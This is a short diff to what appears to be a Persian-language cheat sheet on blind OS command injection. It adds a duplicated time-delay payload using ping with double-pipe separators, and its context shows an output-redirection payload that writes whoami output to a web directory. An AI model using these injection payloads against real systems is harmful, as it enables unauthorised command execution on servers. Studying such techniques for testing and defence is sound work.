@@ -19,6 +19,9 @@
 ```
 
 ## Blind OS Command Injection
+<li>Time delays : ```x||ping+-c+10+127.0.0.1||```
+<li><p align="right">در این حالت پس از اجرای دستور فوق، 10 ثانیه طول می کشد تا response را در مرورگر مشاهده کنیم</p></li>
+</li>
 - Time delays : ```x||ping+-c+10+127.0.0.1||```
   - <p align="right">در این حالت پس از اجرای دستور فوق، 10 ثانیه طول می کشد تا response را در مرورگر مشاهده کنیم</p> 
 - Output redirection : ```||whoami>/var/www/images/output.txt||```
